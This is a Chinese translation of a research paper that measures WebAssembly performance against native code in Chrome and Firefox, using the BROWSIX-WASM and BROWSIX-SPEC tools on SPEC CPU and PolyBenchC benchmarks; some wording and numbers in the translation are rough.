<h1 id="从BROWSIX到BROWSIX-WASM"><a href="#从BROWSIX到BROWSIX-WASM" class="headerlink" title="从BROWSIX到BROWSIX-WASM"></a>从BROWSIX到BROWSIX-WASM</h1><p>BROWSIX[29]在浏览器中模拟Unix内核，并包括一个将本机程序编译为JavaScript的编译器（基于Emscripten [33,39]）。而且,它们允许在C，C++和Go在浏览器中运行，并自由使用操作系统服务，例如管道，进程和文件系统。 但是，BROWSIX有两个必须克服的主要限制。 首先，BROWSIX将本地代码编译为JavaScript，而不是WebAssembly。 其次，BROWSIX内核存在严重的性能问题。 特别是，在BROWSIX中，几个常见的系统调用具有非常高的开销，这使得很难将在BROWSIX中运行的程序的性能与本地运行的程序的性能进行比较。</p>
<p>我们通过构建一个新的浏览器环境来解决这些限制, 叫做BROWSIX-WASM,可以支持webassembly,并且消除Browsix的性能缺陷.</p>
<p><strong>Emscripten运行时修改</strong> BROWSIX修改Emscripten编译器以允许进程（在WebWorkers中运行）与BROWSIX内核（在页面的主线程上运行）通信。 由于BROWSIX将本机程序编译为JavaScript，因此相对简单：每个进程的内存都是与内核共享的缓冲区（一个共享的arraybuffer），因此系统调用可以直接读写进程内存。但是，这种方法有两个明显的缺点。 首先，它阻止了堆的按需增长；共享内存的大小必须足够大，可以在整个过程中满足应用程序的运行的最大的堆大小。 其次，JavaScript上下文（如主上下文和每个Webworker上下文）对其堆大小有固定的限制，目前在Google Chrome浏览器中约为2.2 GB [6]。此上限对运行多个过程产生了严重限制： 如果每个进程保留500 MB的堆，BROWSIX最多只能运行四个并发进程。更深的问题是WebAssembly内存不能在WebWorkers之间共享，并且不支持Atomic(原子)API，BROWSIX用它来用来等待系统调用。 </p>
<p>BROWSIX-WASM使用不同的方法进行进程内核通信，该方法也比BROWSIX方法更快.BROWSIX-WASM修改Emscripten运行时系统，为与内核共享的每个过程创建一个辅助缓冲区（64MB），但不同于进程内存，该方法也比BROWSIX方法更快。 由于此辅助缓冲区是SharedArray缓冲区，因此BROWSIX-WASM进程和内核可以使用原子API进行通信。当系统调用引用进程堆中的字符串或缓冲区（例如writevorstat）时，其运行时系统会将数据从进程内存复制到共享缓冲区，并向内核发送一条消息，其中包含复制数据在辅助内存中的位置。 类似地，当系统调用将数据写入辅助缓冲区（例如读取）时，其运行时系统会将数据从共享缓冲区复制到指定内存中的进程内存。 此外，如果系统调用在过程存储器中指定了内核要写入（例如，读取）的缓冲区，则运行时在辅助存储器中分配相应的缓冲区，并将其传递给内核。 如果系统调用正在读取或写入大小超过64MB的数据，则BROWSIX-WASM将此调用划分为多个调用，这样每个调用最多只能读取或写入64MB的数据。 这些内存复制操作的成本与系统调用调用的总成本相比是微不足道的，后者涉及在过程和内核JavaScript上下文之间发送消息。 我们在第4.2.1节中显示，BROWSIX-WASM的开销可以忽略不计</p>
<p><strong>性能优化</strong> 在构建BROWSIX-WASM并进行初步性能评估时，我们在BROWSIX内核的某些部分发现了一些性能问题。 如果不解决这些性能问题，将影响WebAssembly与本机代码之间的性能比较的有效性。 最严重的情况是在BROWSIX / BROWSIX-WASM，BROWSERFS包含的共享文件系统组件中。 最初，在文件的每个追加操作上，BROWSERFS会分配一个更大的新缓冲区，将先前和新内容复制到新缓冲区中。 小附件可能会导致性能大幅下降。 现在，只要缓冲区支持文件需要额外的空间，BROWSERFS就会使缓冲区至少增加4 KB。 仅此一项更改就将BROWSIX中464.h264基准测试的时间从25秒减少到1.5秒以下。 我们进行了一系列改进，以减少整个BROWSIX-WASM的开销。 类似地，即使不是很引人注目的，也进行了改进, 以减少管道内核实现中的分配内存数量和复制次数。</p>
<h1 id="BROWSIX-SPEC"><a href="#BROWSIX-SPEC" class="headerlink" title="BROWSIX-SPEC"></a>BROWSIX-SPEC</h1><p>为了在获得性能测试数据的同时,可靠地执行WebAssembly基准测试，我们开发了BROWSIX-SPEC。 BROWSIX-SPEC与BROWSIX-WASM一起使用可管理生成的浏览器实例，提供基准测试资料（例如，已编译的WebAssembly程序和测试输入），生成性能测试数据并验证基准输出。</p>
<p>我们使用BROWSIX-SPEC运行三个基准套件来评估WebAssembly的性能：SPEC CPU2006，SPEC CPU2017和PolyBenchC。 这些基准测试使用Clang 4.0和WebAssembly通过BROWSIX-WASM编译为本地代码。 我们没有对Chrome或Firefox进行任何修改，并且浏览器在启用其标准沙箱和隔离功能的情况下运行。BROWSIX-WASM构建在标准的web平台,不需要访问主机的资源,相反,基准测试是对BROWSIX-SPEC发起HTTP请求.</p>
<h2 id="3-1-BROWSIX-SPEC基准测试执行"><a href="#3-1-BROWSIX-SPEC基准测试执行" class="headerlink" title="3.1 BROWSIX-SPEC基准测试执行"></a>3.1 BROWSIX-SPEC基准测试执行</h2><p>图片2显示, BROWSIX-SPEC运行是的主要片段,比如<em>401.bzip2</em>.<br>首先（1），BROWSIX-SPEC基准测试工具使用WebBrowser自动化工具<a href="https://www.seleniumhq.org/">Selenium</a>启动新的浏览器实例.<br>（2）浏览器从基准测试工具通过HTTP加载页面的HTML，执行JS和BROWSIX-WASM内核JS。<br>（3）执行的JS初始化BROWSIX-WASM内核并启动执行runspecshell脚本的BROWSIX-WASM进程（图2中未显示）。runspecin生成标准规范调用（未显示），该规范是从SPEC2006中提供的C源代码编译而成的。 specinvoke读取BROWSIX-WASM文件系统中的.cmd文件，并使用适当的参数启动401.bzip2。<br>（4）在实例化WebAssembly模块之后在调用基准测试的主要功能之前，BROWSIX-WASM用户空间运行时向BROWSIX-SPEC发出了XHR请求，以开始记录性能计数器的统计信息。<br>（5）该基准测试程序找到与Web Worker401.bzip2进程相对应的Chrome线程，并将其附加到该进程。<br>（6）在基准测试结束时，BROWSIX-WASM用户空间运行时对基准测试工具发送最终的XHR，以结束性能记录过程。 当runspec程序退出时（可能多次调用了测试二进制文件之后），</p>
<p>SPEC归档的控制JS POST（7）一个tar压缩包目录进入BROWSIX-SPEC。 BROWSIX-SPEC收到完整的结果存档后，将结果解压缩到一个临时目录中，并使用SPEC 2006随附的cmptool验证输出。最后，BROWSIX-SPEC杀死浏览器进程并记录基准测试结果。</p>
<p><img data-src="./fig2.png" alt="图片2:在浏览器中SPEC基准测试的框架.加粗的部分是新的或者大量修改的"></p>
<h1 id="评估"><a href="#评估" class="headerlink" title="评估"></a>评估</h1><p>我们使用BROWSIX-WASM和BROWSIX-SPEC的SPEC CPU2006, SPEC CPU2017, and PolyBenchC三个基准来评估WebAssembly的性能.我们使用PolybenchC基准测试，以与原始WebAssembly论文进行比较[18]，但认为这些基准测试并不代表典型的工作负载。 SPEC基准是具有代表性的，通过BROWSIX-WASM成功运行。 我们在具有超线程功能的6核IntelXeon E5-1650 v3 CPU和64 GB的RAM（运行Ubuntu 16.04和Linux内核v4.4.0）上运行所有基准测试。 我们使用两种最先进的浏览器运行所有基准测试：GoogleChrome 74.0和Mozilla Firefox 66.0。 我们使用Clang 4.0将基准编译为远原生代码，并使用BROWSIX-WASM（基于Emscripten withClang 4.0）将基准编译为WebAssembly。每个基准执行了五次。 记录所有运行时间的平均值和标准错误。执行时间是通过程序开始运行的时间差计算的, 例如, 开始时间是webassembly的编译结束开始.</p>
<h2 id="PolyBenchC-Benchmarks"><a href="#PolyBenchC-Benchmarks" class="headerlink" title="PolyBenchC Benchmarks"></a>PolyBenchC Benchmarks</h2><p>哈斯等[18]使用PolybenchC来对webassembly实现进行基准测试，因为PolybenchC基准测试不会进行系统调用。 正如我们已经论证的那样，PolybenchC基准是小型科学内核，通常用于基准多面体优化技术，并不代表较大的应用程序。 但是，对我们来说，使用BROWSIX-WASM运行PolybenchC仍然很有价值，因为它表明我们使用的基础结构是调用没有任何开销。 图3a显示了在本机运行时BROWSIX-WASM中PolyBenchC基准测试的执行时间。 我们能够从原始WebAssembly论文[18]中复制大部分结果。 我们发现，BROWSIX-WASM的开销非常低：平均为0.2％，最大为1.2％。<br><img data-src="./fig3.png" alt="图片3:使用BROWSIX-WASM和BROWSIX-SPEC编译为WebAssembly（在Chromeand Firefox中执行）的PolyBenchC和SPEC CPU基准测试的性能。 SPEC CPU基准测试的总体开销比PolyBenchC套件更高，这表明WebAssembly与本机之间存在明显的性能差距。"></p>
<h2 id="SPEC-Benchmarks"><a href="#SPEC-Benchmarks" class="headerlink" title="SPEC Benchmarks"></a>SPEC Benchmarks</h2><p>现在，我们使用SPEC CPU2006和SPEC CPU2017（新的C / C ++基准和速度基准）中的C / C ++基准评估BROWSIX-WASM，它们广泛使用系统调用。 我们排除了不能编译为WebAssembly5或分配的内存超出WebAssembly允许范围的四个数据点。表1显示了在Chrome和Firefox中都使用BROWSIX-WASM运行时以及本机运行时SPEC基准测试的绝对执行时间。<br><img data-src="./table1.png" alt="表格1: SPEC CPU基准测试本机（Clang）和WebAssembly（Chrome和Firefox）的执行时间（共5次）的详细细分； 所有时间都以秒为单位。 对于Chrome浏览器，WebAssembly的平均降低速度为1.53倍，对于Firefox，则为1.54倍。"></p>
<p><img data-src="./table2.png" alt="表格2: 针对Clang 4.0和WebAssembly (Chrome)的SPEC CPU基准测试的编译时间(平均5次);时间以秒为单位。"></p>
<p>对于所有基准而言，WebAssembly的性能都比本地性能差，除了429.mcfand433.milc。 在Chrome浏览器中，Web-Assembly的最大开销是原生的2.5倍，并且15个基准测试中有7个的运行时间是本机的1.5倍。 在Firefox中，对于15个基准测试中的7个，WebAssembly的性能是本机的2.08倍，性能是本机的1.5倍。平均而言，WebAssembly比Chrome中的本机慢1.55倍，比Firefox中的慢1.45倍。表格2展示的是编译为SPEC的时间.据我们所知，Fire-fox无法报告WebAssembly的编译时间。）在所有情况下，与执行时间相比，编译时间可以忽略不计。 但是，Clang编译器比WebAssembly编译器低几个数量级。 最后，请注意，Clang从C ++源代码编译基准，而Chrome编译WebAssembly，这是比C ++更简单的格式。</p>
<h3 id="BROWSIX-WASM开销"><a href="#BROWSIX-WASM开销" class="headerlink" title="BROWSIX-WASM开销"></a>BROWSIX-WASM开销</h3><p>非常重要的一件事, 是要排除运行速度是下降是由于BROWSIX-WAS性能不佳的可能。 特别是，BROWSIX-WASM在不修改浏览器的情况下实现了系统调用，而系统调用涉及到复制数据（第2节），这可能会很昂贵。 为了量化BROWSIX-WASM的开销，我们对系统调用进行了分析，以测量在BROWSIX-WASM中花费的所有时间。图4显示了使用SPEC基准测试在Firefox中在BROWSIX-WASM中花费的时间百分比。 对于15个基准中的14个，间接费用不到0.5％。 最大开销为1.2％。 平均而言，BROWSIX-WASM的开销仅为0.2％。 因此，我们得出结论，BROWSIX-WASM的开销可以忽略不计，并且基本上不会影响WebAssembly中执行的程序的性能结果.<br><img data-src="./fig4.png" alt="图片4:irefox中为SPEC基准测试而在Firefox中的BROWSIX-WASM调用中花费的时间（％）已编译为WebAssembly.BROWSIX-WASM的平均开销仅为0.2%"></p>
<h3 id="WebAssembly-和asm-js比较"><a href="#WebAssembly-和asm-js比较" class="headerlink" title="WebAssembly 和asm.js比较"></a>WebAssembly 和asm.js比较</h3><p>WebAssembly原始工作的一个主要说法是，它的运行速度明显快于assm.js。 现在，我们使用SPEC基准测试该声明。 为了进行比较，我们修改了BROWSIX-WASM还支持编译为asasm.js的进程。 替代方法是使用原始的BROWSIX对theasm.js进程进行基准测试。 但是，正如我们前面所讨论的那样，BROWSIX的性能问题可能会威胁到我们结果的有效性。图5显示了使用WebAssembly的SPEC基准测试的加速，相对于同时使用Chrome和Firefox的asm.js的运行时间. WebAssembly在Chrome中比asasm.js快1.54倍，在Firefox中比assm.js快1.39倍.<br><img data-src="./fig5.png" alt="图片5: asm.js到Chrome和Firefox WebAssembly的相对时间。 WebAssembly在Chrome中比asasm.js快1.54倍，在Firefox中比assm.js快1.39倍"></p>
<p><img data-src="fig6.png" alt="图片6: sm.js的相对最佳时间与WebAssembly的最佳时间相对。 WebAssembly比asm.js快1.3倍。"></p>
<p>由于Chrome和Firefox的性能差异很大，因此在图6中，我们通过选择性能最佳的WebAssembly浏览器和性能最佳的asm.js浏览器（即，它们可能是不同的浏览器）来显示每个基准测试的加速。 这些结果表明，WebAssembly始终比asm.js表现更好，平均速度提高了1.3倍。 哈斯等[18]还发现，使用PolyBenchC，WebAssembly的平均速度为1.3×overasm.js。</p>
<h1 id="例子研究-矩阵操作"><a href="#例子研究-矩阵操作" class="headerlink" title="例子研究: 矩阵操作"></a>例子研究: 矩阵操作</h1><p>在本节中，我们将使用执行矩阵乘法的C函数来说明WebAssembly与本机代码之间的性能差异，如图7a所示。矩阵作为函数的参数提供，A（NI×NK）和B（NK×NJ）的结果存储在C（NI×NJ）中，其中NI，NK，NJ是程序中定义的常数。<br><img data-src="fig7.png"></p>
<p>在WebAssembly中，此功能比具有各种矩阵大小的Chrome和Firefox慢2到3.4倍（图8）。 由于WebAssembly不支持矢量化指令，因此我们使用-O2编译了该功能并禁用了自动矢量化。<br><img data-src="fig8.png"></p>
<p>图7b显示了由clang-4.0为功能生成的本机代码。 按照SystemV AMD64 ABI调用约定<a href="SystemVApplicationBinaryInterfaceAMD64ArchitectureProcessorSupplement.https://software.intel.com/sites/default/files/article/402129/mpx-linux64-abi.pdf,2013.">9</a>中的指定，参数将传递到rdi，rsi和rdx寄存器中的函数。 第2-26行是迭代器inr8d的第一个循环的主体。 第5至21行包含带有inr9d的第二个循环的主体。 第10-16行包含带有迭代器存储的inrcx的第三个循环的主体。 Clang可以通过使用-NJ初始化rcx，在第15行的每次迭代中递增rcx并使用jneto测试状态寄存器的零标志（当rcx变为0时设置为1）来消除内循环中的错误。</p>
<p>图7c显示了Chrome为其WebAssembly编译版本的matmul编写的x86-64代码。 该代码已被稍作修改-生成的代码中的小点已删除，以供演示。 Chrome的调用约定后，函数参数通过intherax，rcx和rdx寄存器传递。 在第1–3行，由于寄存器在第7–9行溢出，寄存器rax，rdx和rcx的内容存储在堆栈中。第7–45行是带有迭代器inedi的第一个循环的主体。 第18–42行包含带有迭代器存储在inr11中的第二个循环的主体。 第27–39行是迭代器存储的ineax的第三个循环的主体。 为了避免由于寄存器在第一个循环的第一次迭代中在第7-9行溢出而导致的内存负载，在第5行产生一个额外的跳转。类似地，分别在第16行和第25行为第二个和第三个循环生成额外的跳转。</p>
<blockquote>
<p>译注: 这两段把我看蒙了. 汇编都出来了. 都忘干净了.</p>
</blockquote>
<h2 id="区别"><a href="#区别" class="headerlink" title="区别"></a>区别</h2><p>Chrome的JIT本机代码具有更多指令，可以防止寄存器压力增加，并且具有比Clang生成的本机代码更多的分支。</p>
<h3 id="增加的代码体积"><a href="#增加的代码体积" class="headerlink" title="增加的代码体积"></a>增加的代码体积</h3><p>Chrome生成的代码（图7c）中的指令数为53，其中包括点，而clang生成的代码（图7b）仅包含28条指令。 Chrome的指令选择算法不佳是代码大小增加的原因之一。</p>
<p>此外，Chrome无法利用x86指令的所有可用内存寻址模式。 在图7b中，Clang在第14行使用add指令，以寄存器寻址模式，在同一操作中从内存地址加载和写入内存地址。另一方面, chrome加载ecx, 加到esx,最后存到ecx, 需要三个指令而不是一个.</p>
<h3 id="增加的寄存器压力"><a href="#增加的寄存器压力" class="headerlink" title="增加的寄存器压力"></a>增加的寄存器压力</h3><p>Clang在图7b中生成的代码不会产生溢出，仅使用10个寄存器。 另一方面，Chrome生成的代码（图7c）使用13个通用寄存器-所有可用的寄存器（r13和r10由V8保留）。 如第5.1.1节所述，避免使用该指令的寄存器寻址模式需要使用一个临时寄存器。 所有这些寄存器效率低下的化合物，在第1–3行向堆栈引入了三个寄存器。 堆栈中存储的值在第7-9行和第18行再次加载到寄存器中。</p>
<h3 id="额外的分支"><a href="#额外的分支" class="headerlink" title="额外的分支"></a>额外的分支</h3><p>Clang（图7b）通过反转循环计数器（第15行）来生成具有单个分支perloop的代码。 相比之下，Chrome（图7c）生成更直接的代码，这需要在循环开始时有条件地跳转。 此外，Chrome会生成额外的跳转，以避免在循环的第一次迭代中由于寄存器溢出而导致的内存负载。 例如，第5行的跳跃避免了第7-9行的溢出。</p>
<h1 id="性能分析"><a href="#性能分析" class="headerlink" title="性能分析"></a>性能分析</h1><p>我们使用BROWSIX-SPEC记录了系统上所有受支持的性能计数器的测量结果，这些指标针对编译为WebAssembly并在Chrome和Firefox中执行的SPECCPU基准测试，以及编译为本机代码的SPEC CPU基准测试（第3节）。</p>
<p>表3列出了我们使用的性能计数器,这里，与本地相比，BROWSIX-WASM性能对这些计数器的影响的摘要。 我们使用这些结果来说明WebAssemblyover本机代码的性能开销。 我们的分析表明，第5节中描述的低效率是普遍存在的，并转化为整个SPEC CPU基准测试套件的性能下降。</p>
<p><img data-src="table3.png"></p>
<h2 id="增加的寄存器压力-1"><a href="#增加的寄存器压力-1" class="headerlink" title="增加的寄存器压力"></a>增加的寄存器压力</h2><p>本节重点介绍两个性能计数器，这些计数器显示增加的套准压力的效果。 图9a给出了相对于本机代码中已退休的加载指令的数量，WebAssembly的SPEC基准在Chrome和Firefox中已退休的加载指令的数量。 类似地，图9b显示了已退休的存储指令的数量。请注意，“已退休”指令是一条离开指令流水线的指令，其结果正确且在体系结构状态下可见（即，不是推测性的）。</p>
<p>Chrome生成的代码为2.02 ×淘汰了更多的加载指令，而淘汰了2.30×的存储指令比本地代码多。 由Firefox生成的代码比本机代码淘汰了1.92倍的加载指令，淘汰了2.16倍的存储指令。 这些结果表明，WebAssembly编译的SPEC CPU基准测试受到寄存器压力增加和内存引用增加的困扰。 下面，我们概述了增加套准压力的原因。</p>
<h3 id="保留的寄存器"><a href="#保留的寄存器" class="headerlink" title="保留的寄存器"></a>保留的寄存器</h3><p>在Chrome中，累积生成三个寄存器溢出，但不使用两个x86-64寄存器：r13和r10（图7c，第7–9行）。这是因为Chrome保留了这两个寄存器。对于JavaScript垃圾收集器，Chrome reserver13指向一个GC数组 随时都有根。 此外，Chrome使用r10和xmm13作为专用的暂存器。类似地，Firefox保留r15作为指向堆开始的指针，而r11和xmm15是JavaScript暂存器。8这些寄存器中的任何一个都不可用于WebAssembly代码。</p>
<h3 id="糟糕的寄存器分配"><a href="#糟糕的寄存器分配" class="headerlink" title="糟糕的寄存器分配"></a>糟糕的寄存器分配</h3><p>除了可用的寄存器数量减少之外，chrome和Firefox在分配寄存器方面都做得很糟糕.<br><img data-src="fig9.png" alt="图片9:WebAssembly相对于本机代码的处理器性能计数器样本。"><br>例如，Chrome格式生成的代码会使用12个寄存器，而Clang生成的本机代码仅使用10个寄存器（第5.1.2节）。 在Firefox和Chrome中，增加的注册使用率是由于它们使用了快速但不是特别有效的注册分配器。 Chrome和Firefox都使用线性扫描寄存器分配器[36]，而Clang使用贪婪的图形着色寄存器分配器[3]，该分配器始终生成更好的代码。</p>
<h3 id="x86寻址模式"><a href="#x86寻址模式" class="headerlink" title="x86寻址模式"></a>x86寻址模式</h3><p>x86-64指令集为每个操作数提供了几种寻址模式，包括寄存器模式（其中指令从寄存器中读取数据或将数据写入寄存器）以及内存地址模式（例如寄存器间接或直接偏移地址），其中操作数位于存储器地址中，并且指令可以 从该地址读取或写入。 通过使用后一种模式，代码生成器可以避免不必要的寄存器压力。 但是，Chrome无法利用这些模式。 例如，由Chrome格式生成的代码不会为该指令使用寄存器间接寻址模式（第5.1.2节），这会产生不必要的寄存器压力。</p>
<h2 id="额外的分支结构"><a href="#额外的分支结构" class="headerlink" title="额外的分支结构"></a>额外的分支结构</h2><p>本节重点介绍两个性能计数器，这些计数器测量执行的分支指令的数量。 图9c显示了Web-Assembly退出的分支指令的数量，相对于本机代码中退出的分支指令的数量。 类似地，图9d显示了退出的条件分支指令的数量。 在Chrome中，分别撤消了1.75倍和1.65倍的无条件和有条件分支指令，而在Firefox中，撤消了1.65倍和1.62倍。 这些结果表明，所有SPEC CPU基准测试都会产生额外的分支，我们在下面解释原因。</p>
<h3 id="6-2-1-对循环来说额外的跳跃指令"><a href="#6-2-1-对循环来说额外的跳跃指令" class="headerlink" title="6.2.1 对循环来说额外的跳跃指令"></a>6.2.1 对循环来说额外的跳跃指令</h3><p>与withmatmul（第5.1.3节）一样，Chrome会为循环生成不必要的跳转语句，从而比Firefox产生更多的分支指令。</p>
<h3 id="为每个函数进行栈溢出检查"><a href="#为每个函数进行栈溢出检查" class="headerlink" title="为每个函数进行栈溢出检查"></a>为每个函数进行栈溢出检查</h3><p>WebAssembly程序使用在每次函数调用时都会增加的aglobal变量来跟踪当前堆栈大小。程序员可以为程序定义最大堆栈大小。为了保证程序不会栈溢出,Chrome和Firefox都在每个函数的开头添加了堆栈检查，以检测当前堆栈大小是否小于最大最大堆栈大小。 这些检查包括额外的比较和条件跳转指令，这些指令必须在每个函数调用上执行。</p>
<h3 id="函数表格索引检查"><a href="#函数表格索引检查" class="headerlink" title="函数表格索引检查"></a>函数表格索引检查</h3><p>WebAssembly动态检查所有间接调用，以确保目标是有效函数，并且该函数的运行时类型与调用地址上指定的类型相同。在WebAssembly模块中，函数表存储函数列表及其类型，Web-Assembly生成的代码使用函数表来实现这些检查。在C / C ++中调用函数指针和虚拟函数时，这些检查是必需的。 这些检查会导致额外的比较和条件跳转指令，这些指令将在每次间接函数调用之前执行。</p>
<h2 id="增加代码体积"><a href="#增加代码体积" class="headerlink" title="增加代码体积"></a>增加代码体积</h2><p>Chrome和Firefox生成的代码比Clang生成的代码大得多。 我们使用三个性能计数器来衡量此效果。 （i）图9e显示了相对于本机代码中退休的指令数量，基准被编译为WebAssembly并在Chrome和Firefox中执行的基准退休的指令数量。 类似地，图9f显示了编译到WebAssembly的基准测试所花费的CPU周期的相对数量，图10显示了L1指令高速缓存未命中的相对数量。</p>
<p>图9e显示，Chrome比本机代码平均执行多1.80倍的指令，而Firefox比本机代码平均执行多1.75倍的指令。 由于指令选择不当，寄存器分配器性能不佳而产生了更多的寄存器溢出（第6.1节）和额外的分支语句（第6.2节），因此WebAssembly的代码生成量大于本机代码，从而导致执行了更多指令。 执行的指令数量的这种增加导致图10中的L1指令高速缓存未命中率增加。平均而言，Chrome遭受的I-cache丢失率比本机代码高出2.83倍，而Firefox遭受的L1指令缓存未命中率高于本机代码。 更多的未命中意味着需要花费更多的CPU周期来等待指令的提取。</p>
<p>我们注意到一个异常：尽管429.mcf在Chrome中退休的指令比本地代码多1.6倍，在Firefox中退休的指令比本地代码多1.5倍，但它的运行速度比本地代码快。 图3b显示其相对于本机的减慢速度在Chrome中为0.81倍，在Firefox中为0.83倍，此异常的原因直接归因于其L1指令高速缓存未命中的数量较少.429.mcf包含一个主循环并且该循环中的大多数指令都适合 在L1指令缓存中。 同样，433.milc的性能由于较少的L1指令高速缓存未命中而更好。在450.soplex,由于执行了多个虚拟功能，Chrome和Firefox中的L1指令高速缓存未命中的错误比本地错误多4.6倍，从而导致更多的间接函数调用</p>
<h2 id="讨论"><a href="#讨论" class="headerlink" title="讨论"></a>讨论</h2><p>值得一问的是，这里确定的性能问题是否是根本的。 我们认为，两个已确定的问题不是：也就是说，可以通过改进实现来改善它们。 今天的WebAssembly实现使用的寄存器分配器（第6.1.2节）和代码生成器（第6.2.1节）的性能要比Clang的差。 但是，像Clang这样的脱机编译器可能会花费更多的时间来生成更好的代码，而WebAssembly编译器必须足够快才能在线运行。 因此，其他JIT所采用的解决方案，如进一步优化热代码，很可能适用于此处[19，32]。</p>
<p>我们定位了四个其他问题, 看起来像是webassembly设计的时候限制:堆栈溢出检查（第6.2.2节），间接调用检查（第6.2.3节）和保留的寄存器（第6.1.1节）会增加运行时成本，并导致代码大小增加（第6.3节）。 不幸的是，这些检查对于WebAssembly的安全保证是必需的。 经过重新设计的WebAssembly，具有更丰富的内存和功能指针类型[23]，也许能够在编译时执行其中的某些检查，但是这可能会使生成WebAssembly的编译器的实现复杂化。 最后，浏览器中的Web-Assembly实现必须与高性能JavaScript实现互操作，这可能会施加其自身的约束。 例如，当前的JavaScript实现保留了一些寄存器供自己使用，这增加了WebAssembly的寄存器压力。</p>
<h1 id="相关工作"><a href="#相关工作" class="headerlink" title="相关工作"></a>相关工作</h1><p><strong>WebAssembly先驱</strong> 这里尝试了在浏览器中执行本机代码的几种尝试，但是它们都没有满足WebAssembly的所有设计标准。</p>
<p>ActiveX [13]允许网页嵌入签名的x86库，但是这些二进制文件对Windows API的访问不受限制。 相反，WebAssembly模块是沙盒装的。 ActiveX现在已被弃用</p>
<p>Native Client [11,37]（NaCl）向Web应用程序添加了一个模块，其中包含平台特定的机器代码。 NaCl引入了沙盒技术，以接近本机的速度执行特定于平台的机器代码。 由于NaCl依赖于机器代码的静态验证，因此它要求代码生成器遵循某些模式，因此仅支持浏览器中的x86，ARM和MIPS指令集的子集。为解决NaCl固有的可移植性问题，PortableNaCl（PNaCl）[ [14]使用LLVM位码作为二进制格式。但是，PNaCl在压缩性方面没有比NaCl提高，并且仍然暴露了编译器和/或平台特定的细节，例如调用堆栈布局。 两者都已被WebAssembly弃用。</p>
<p>asm.jsis是JavaScript的一个子集，旨在有效地编译为本机代码。asm.js使用强类型来避免JavaScript的动态类型系统。 由于assm.js是JavaScript的子集，因此将所有本机功能（例如64位整数）添加到asm.js时，首先需要扩展JavaScript。与asm.js相比，WebAssembly提供了一些改进：（i）WebAssembly二进制文件由于其轻量级的表示形式而比JavaScript源码紧凑，（ii）WebAssembly更易于验证，（iii）WebAssembly提供形式安全性和隔离性的形式保证，并且（iv）WebAssembly已被证明比assm.js具有更好的性能。</p>
<p>WebAssembly是一个堆栈机，它类似于java虚拟机[21]和通用语言运行时[25]。然而，WebAssembly与这些平台有很大的不同。例如，WebAssembly不支持对象，也不支持非结构化的控制流.</p>
<p>WebAssembly规范定义了其操作语义和类型系统。 使用Isabelle定理证明者对该证明进行了机械化，并且机械化工作发现并解决了规范中的许多问题[35]。 RockSalt [22]是针对NaCl的类似验证工作。 它在Coq中实施NaCl验证工具链，并针对NaCl支持的x86指令的子集模型提供正确性证明</p>
<p><strong>使用性能计数器对SPEC基准进行分析</strong>一些论文使用性能计数器来分析SPEC基准。 熊猫等。 [26]分析SPECCPU2017基准，应用统计技术确定基准之间的相似性。 Phansalkar等。 对SPEC CPU2006进行类似的研究[27]。 Limaye和Adegija指出了SPEC CPU2006和SPEC CPU2017之间的工作负载差异[20]。</p>
<h1 id="结论"><a href="#结论" class="headerlink" title="结论"></a>结论</h1><p>本文进行了WebAssembly的首次综合性能分析。 我们开发了BROWSIX-WASM（BROWSIX的重要扩展）和BROWSIX-SPEC（可进行详细性能分析的工具），以便在Chrome和Firefox中以WebAssembly的形式运行SPEC CPU2006和CPU2017基准测试。 我们发现，在SPEC基准测试中，WebAssembly相对于本机的均值降低为Chrome浏览器的1.55倍和Firefox的1.45倍，Chrome的峰值降低为2.5倍，Firefox的峰值降低为2.08倍。 我们找出造成这些性能差距的原因，为将来的优化工作提供可操作的指导。</p>
<h1 id="References"><a href="#References" class="headerlink" title="References"></a>References</h1><p>[1]: Blazor.<a href="https://blazor.net/">https://blazor.net/</a>.   [Online; accessed5-January-2019].</p>
<p>[2]: CompilingfromRusttoWebAssembly.<a href="https://developer.mozilla.org/en-US/docs/WebAssembly/Rust_to_wasm.[Online">https://developer.mozilla.org/en-US/docs/WebAssembly/Rust_to_wasm.[Online</a>;   accessed5-January-2019].</p>
<p>[3]: LLVM Reference Manual.<a href="https://llvm.org/docs/CodeGenerator.html">https://llvm.org/docs/CodeGenerator.html</a>.</p>
<p>[4]: NaCl and PNaCl.<a href="https://developer.chrome.com/native-client/nacl-and-pnacl">https://developer.chrome.com/native-client/nacl-and-pnacl</a>. [Online; accessed5-January-2019].</p>
<p>[5]: PolyBenchC:the    polyhedral   benchmark   suite.<a href="http://web.cs.ucla.edu/~pouchet/software/polybench/">http://web.cs.ucla.edu/~pouchet/software/polybench/</a>.  [Online; accessed 14-March-2017].</p>
<p>[6]: Raise   Chrome   JS   heap   limit?-   Stack   Over-flow.<a href="https://stackoverflow.com/questions/43643406/raise-chrome-js-heap-limit">https://stackoverflow.com/questions/43643406/raise-chrome-js-heap-limit</a>.  [Online;accessed 5-January-2019].</p>
<p>[7]: Use   cases.<a href="https://webassembly.org/docs/use-cases/">https://webassembly.org/docs/use-cases/</a>.</p>
<p>[8]: WebAssembly.<a href="https://webassembly.org/">https://webassembly.org/</a>.   [On-line; accessed 5-January-2019].</p>
<p>[10]: Steve   Akinyemi.A   curated  list  of  languagesthat  compile  directly  to  or have  their VMs  in  Web-Assembly.<a href="https://github.com/appcypher/awesome-wasm-langs">https://github.com/appcypher/awesome-wasm-langs</a>.   [Online; accessed 5-January-2019].</p>
<p>[11]: Jason Ansel, Petr Marchenko, Úlfar Erlingsson, ElijahTaylor, Brad Chen, Derek L. Schuff, David Sehr, Cliff L.Biffle, and Bennet Yee.  Language-independent Sand-boxing of Just-in-time Compilation and Self-modifyingCode.InProceedings of the 32nd ACM SIGPLANConference on Programming Language Design and Im-plementation, PLDI ’11, pages 355–366. ACM, 2011.</p>
<p>[12]: Michael Bebenita, Florian Brandner, Manuel Fahndrich,Francesco Logozzo, Wolfram Schulte, Nikolai Tillmann,and Herman Venter.  SPUR: A Trace-based JIT Com-piler for CIL.  InProceedings of the ACM InternationalConference on Object Oriented Programming SystemsLanguages and Applications, OOPSLA ’10, pages 708–725. ACM, 2010.</p>
<p>[13]: David A Chappell.Understanding ActiveX and OLE.Microsoft Press, 1996.</p>
<p>[14]: Alan Donovan, Robert Muth, Brad Chen, and DavidSehr.PNaCl:    Portable  Native  Client  Executa-bles.<a href="https://css.csail.mit.edu/6.858/2012/readings/pnacl.pdf">https://css.csail.mit.edu/6.858/2012/readings/pnacl.pdf</a>, 2010.</p>
<p>[15]: Brendan    Eich.From    ASM.JS    to    Web-Assembly.<a href="https://brendaneich.com/2015/06/from-asm-js-to-webassembly/">https://brendaneich.com/2015/06/from-asm-js-to-webassembly/</a>, 2015.  [Online;accessed 5-January-2019].</p>
